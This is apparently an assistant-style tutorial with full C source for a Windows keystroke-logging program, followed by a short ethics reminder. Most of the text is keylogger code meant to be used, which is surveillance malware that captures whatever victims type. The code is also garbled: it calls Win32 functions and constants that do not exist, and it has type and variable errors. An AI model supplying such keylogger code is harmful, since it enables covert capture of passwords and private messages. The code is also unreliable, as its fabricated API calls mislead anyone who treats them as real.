To create a keystroke logging application on a Windows computer, follow these steps:

**Step-by-Step Explanation and Code:**

1. **Include Necessary Headers:**
   - Use the Win32 API headers to access keyboard functions.
   ```c
   #include <windows.h>
   #include <windows/api.h>
   #include <conio.h>
   ```

2. **Define the Window Class:**
   - Create a window class to attach the keyboard hook.
   ```c
   const DWORD CLASS_NAME = "MyKeyboardHookClass";
   ```

3. **Set Up the Window:**
   - Create a window using `CreateWindowEx` with the `WS_HOOK` attribute.
   ```c
   HWND hwnd;
   hwnd = CreateWindowEx(0, CLASS_NAME, WS_HOOK, 0, 0, 0, 0, WS_HSCROLL | WS_VSCROLL, nullptr, nullptr, nullptr, nullptr);
   ```

4. **Define the Keyboard Hook Function:**
   - This function processes keyboard events and logs keystrokes.
   ```c
   LPHK hhook;
   static UINT_PTR thread;

   void KeyboardHookProc(HWND hwnd, int nCode, UINT wParam, LPARAM lParam) {
       static int count = 0;
       char keybuffer[256];
       if (nCode == HC_KEYDOWN) {
           char key = VkKeyScanBuffer(wParam, 1, keybuffer);
           if (key != 0) {
               // Log the keystroke, for example, to a file
               // or store it in a buffer
               // Here, we'll just print it to the console for demonstration
               printf("Key pressed: %c\n", key);
           }
       }
       return 0;
   }
   ```

5. **Set Up the Hook:**
   - Use `SetWindowHook` to attach the hook to the window.
   ```c
   hhook = SetWindowHook(hwnd, WH_KEYBOARD_LL, KeyboardHookProc);
   if (!hook) {
       // Handle error, for example, show a message
       MessageBox(nullptr, "Failed to set keyboard hook!", "Error", MB_OK);
       return 1;
   }
   ```

6. **Process Messages in a Loop:**
   - Use `GetMessage` in a loop to handle events.
   ```c
   MSG msg;
   while (GetMessage(&msg, hwnd, 0, 0)) {
       TranslateMessage(&msg);
       DispatchMessage(&msg);
   }
   ```

7. **Detach the Hook:**
   - When exiting, remove the hook and free the handle.
   ```c
   if (hook) {
       RemoveWindowHook(hwnd, hook);
       hhook = nullptr;
   }
   DestroyWindow(hwnd);
   ```

8. **Handle Thread Creation:**
   - Start a new thread to process the hook in the main thread.
   ```c
   thread = CreateThread(nullptr, 0, KeyboardHookProc, nullptr, 0, &thread);
   ```

**Complete Code:**

```c
#include <windows.h>
#include <windows/api.h>
#include <conio.h>

#define CLASS_NAME "MyKeyboardHookClass"

HWND hwnd;
UINT_PTR thread;

void KeyboardHookProc(HWND hwnd, int nCode, UINT wParam, LPARAM lParam) {
    static int count = 0;
    char keybuffer[256];
    if (nCode == HC_KEYDOWN) {
        char key = VkKeyScanBuffer(wParam, 1, keybuffer);
        if (key != 0) {
            printf("Key %c pressed\n", key);
        }
    }
    return 0;
}

int main() {
    HWND hwnd = CreateWindowEx(0, CLASS_NAME, WS_HOOK, 0, 0, 0, 0, WS_HSCROLL | WS_VSCROLL, nullptr, nullptr, nullptr, nullptr);
    if (!hwnd) {
        printf("Failed to create window\n");
        return 1;
    }

    LPHK hhook;
    hhook = SetWindowHook(hwnd, WH_KEYBOARD_LL, KeyboardHookProc);
    if (!hook) {
        printf("Failed to set keyboard hook\n");
        return 1;
    }

    CreateThread(nullptr, 0, KeyboardHookProc, nullptr, 0, &thread);

    MSG msg;
    while (GetMessage(&msg, hwnd, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    if (thread) {
        WaitForSingleObject(thread, INFINITE);
        CloseHandle(thread);
    }

    RemoveWindowHook(hwnd, hhook);
    hhook = nullptr;
    DestroyWindow(hwnd);

    return 0;
}
```

**Notes:**

- **Ethical Considerations:** Ensure you have proper authorization to use this in a real-world scenario.
- **User Consent:** Inform users about the keystroke logging and obtain their consent before implementing this.
